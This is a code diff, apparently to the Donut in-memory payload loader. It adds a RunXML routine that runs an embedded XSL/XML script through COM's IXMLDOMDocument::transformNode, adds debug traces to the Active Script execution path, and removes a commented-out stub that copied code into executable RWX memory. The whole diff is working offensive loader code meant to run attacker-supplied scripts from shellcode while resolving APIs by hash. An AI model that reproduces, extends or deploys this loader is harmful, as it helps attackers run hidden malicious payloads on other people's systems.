@@ -644,33 +644,57 @@ BOOL DownloadModule(PDONUT_INSTANCE inst) {
     return bResult;
 }
 
-/**
-typedef VOID (__cdecl *SetActiveScriptVtbl_t)(IActiveScriptSiteVtbl2*);
-
-PVOID SetActiveScriptVtblStub(PDONUT_INSTANCE inst, IActiveScriptSiteVtbl2 *vf_tbl) {
-    SetActiveScriptVtbl_t SetActiveScriptVtbl;
-    PBYTE                 cs;
+VOID RunXML(PDONUT_INSTANCE inst) {
+    IXMLDOMDocument *pDoc; 
+    IXMLDOMNode     *pNode;
+    HRESULT         hr;
+    PWCHAR          xml_str;
+    VARIANT_BOOL    loaded;
+    BSTR            res;
+    PDONUT_MODULE   mod;
     
-    // 1. Allocate RWX memory for virtual functions
-    cs = (PBYTE)inst->api.VirtualAlloc(
-        NULL, inst->initScriptLen, 
-        MEM_COMMIT | MEM_RESERVE, 
-        PAGE_EXECUTE_READWRITE);
-        
-    // 2. If allocated, copy functions over
-    if(cs != NULL) {
-      Memcpy(cs, inst->initScript, inst->initScriptLen);
-      
-      // 3. Set pointer to initialization function and invoke.
-      //    Offset for both 32 and 64-bit is currently 0x4F
-      SetActiveScriptVtbl = 
-        (SetActiveScriptVtbl_t) cs;
-        
-      SetActiveScriptVtbl(vf_tbl);
+    if(inst->type == DONUT_INSTANCE_PIC) {
+      DPRINT("Using module embedded in instance");
+      mod = (PDONUT_MODULE)&inst->module.x;
+    } else {
+      DPRINT("Loading module from allocated memory");
+      mod = inst->module.p;
     }
-    return cs;
+    
+    // 1. Initialize COM
+    DPRINT("CoInitializeEx");
+    hr = inst->api.CoInitializeEx(NULL, COINIT_MULTITHREADED);
+    if(hr == S_OK) {
+      // 2. Instantiate XMLDOMDocument object
+      DPRINT("CoCreateInstance");
+      hr = inst->api.CoCreateInstance(
+        &inst->xCLSID_DOMDocument30, 
+        NULL, CLSCTX_INPROC_SERVER,
+        &inst->xIID_IXMLDOMDocument, 
+        (void**)&pDoc);
+        
+      if(hr == S_OK) {
+        // 3. load XML file
+        DPRINT("IXMLDOMDocument::loadXML");
+        hr = pDoc->lpVtbl->loadXML(pDoc, (BSTR)mod->data, &loaded);
+        if(hr == S_OK && loaded) {
+          // 4. query node interface
+          DPRINT("IXMLDOMDocument::QueryInterface");
+          hr = pDoc->lpVtbl->QueryInterface(
+            pDoc, &inst->xIID_IXMLDOMNode, (void **)&pNode);
+            
+          if(hr == S_OK) {
+            // 5. execute script
+            DPRINT("IXMLDOMDocument::transformNode");
+            hr = pDoc->lpVtbl->transformNode(pDoc, pNode, &res);
+            pNode->lpVtbl->Release(pNode);
+          }
+        }
+        pDoc->lpVtbl->Release(pDoc);
+      }
+      inst->api.CoUninitialize();
+    }
 }
-*/
 
 // forward reference to methods
 static STDMETHODIMP QueryInterface(IActiveScriptSite *this, REFIID riid, void **ppv);
@@ -716,6 +740,7 @@ VOID RunScript(PDONUT_INSTANCE inst) {
     vf_tbl.OnLeaveScript       = ADR(ULONG_PTR, OnLeaveScript);
     
     // 2. Initialize COM, MyIActiveScriptSite and event for OnLeaveScript method
+    DPRINT("CoInitializeEx");
     inst->api.CoInitializeEx(NULL, COINIT_MULTITHREADED);
     
     mas.site.lpVtbl    = (IActiveScriptSiteVtbl*)&vf_tbl;
@@ -724,12 +749,14 @@ VOID RunScript(PDONUT_INSTANCE inst) {
     mas._SetEvent      = (SetEvent_t)inst->api.SetEvent;
     
     // 3. Instantiate the active script engine
+    DPRINT("CoCreateInstance");
     hr = inst->api.CoCreateInstance(
       &inst->xCLSID_ScriptLanguage, 0, CLSCTX_ALL, 
       &inst->xIID_IActiveScript, (void **)&engine);
       
     if(hr == S_OK) {
       // 4. Get IActiveScriptParse object from engine
+      DPRINT("IActiveScript::QueryInterface");
 		  hr = engine->lpVtbl->QueryInterface(
         engine, 
         #ifdef _WIN64
@@ -741,21 +768,26 @@ VOID RunScript(PDONUT_INSTANCE inst) {
         
       if(hr == S_OK) {
         // 5. Initialize parser
+        DPRINT("IActiveScriptParse::InitNew");
         hr = parser->lpVtbl->InitNew(parser);
 				if(hr == S_OK) {
           // 6. Set custom script interface
+          DPRINT("IActiveScript::SetScriptSite");
           hr = engine->lpVtbl->SetScriptSite(
             engine, (IActiveScriptSite *)&mas);
           if(hr == S_OK) {
             // 7. Load script
+            DPRINT("IActiveScriptParse::ParseScriptText");
             hr = parser->lpVtbl->ParseScriptText(
               parser, (LPCOLESTR)mod->data, 0, 0, 0, 0, 0, 0, 0, 0);
             if(hr == S_OK) {
               // 8. Run script
+              DPRINT("IActiveScript::SetScriptState");
               hr = engine->lpVtbl->SetScriptState(
                 engine, SCRIPTSTATE_CONNECTED);
                 
               // 9. Wait for script to end
+              DPRINT("WaitForSingleObject");
               inst->api.WaitForSingleObject(mas.hEvent, INFINITE);
             }
           }
@@ -956,7 +988,7 @@ LPVOID xGetProcAddress(PDONUT_INSTANCE inst, ULONG64 ulHash, ULONG64 ulIV) {
 
 // Function to return the program counter.
 // Always placed at the end of payload.
-// Tested with x86 and x64 builds of MSVC 2017 and MinGW. YMMV
+// Tested with x86 and x64 builds of MSVC 2017 and MinGW. YMMV.
 #if defined(_MSC_VER) 
   #if defined(_M_X64)
 
